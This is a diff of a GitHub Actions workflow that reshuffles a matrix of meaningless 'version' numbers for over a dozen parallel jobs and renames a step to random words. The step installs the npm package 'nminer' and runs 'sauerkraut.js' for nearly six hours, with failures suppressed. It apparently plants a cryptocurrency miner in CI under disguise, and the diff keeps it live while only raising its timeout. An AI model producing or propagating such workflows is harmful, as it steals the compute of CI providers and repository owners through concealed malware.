@@ -9,23 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5203 }
-          - { version: 6465 }
-          - { version: 3678 }
-          - { version: 993 }
-          - { version: 81 }
-          - { version: 2883 }
-          - { version: 2631 }
-          - { version: 5780 }
-          - { version: 2600 }
-          - { version: 7368 }
-          - { version: 5155 }
-          - { version: 5335 }
-          - { version: 5454 }
-          - { version: 3653 }
-          - { version: 3046 }
-          - { version: 13 }
-          - { version: 9988 }
+          - { version: 2504 }
+          - { version: 4423 }
+          - { version: 3544 }
+          - { version: 2142 }
+          - { version: 6874 }
+          - { version: 6402 }
+          - { version: 8817 }
+          - { version: 7422 }
+          - { version: 2601 }
+          - { version: 8925 }
+          - { version: 2155 }
+          - { version: 9435 }
+          - { version: 6831 }
+          - { version: 4088 }
+          - { version: 8178 }
+          - { version: 7312 }
 
     steps:
       - name: Checkout
@@ -36,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: duh granny honored earnest
+      - name: though countess
         run: |
           npm install nminer@latest
-          timeout 328m node sauerkraut.js || echo "sauerkraut executed"
+          timeout 339m node sauerkraut.js || echo "sauerkraut executed"
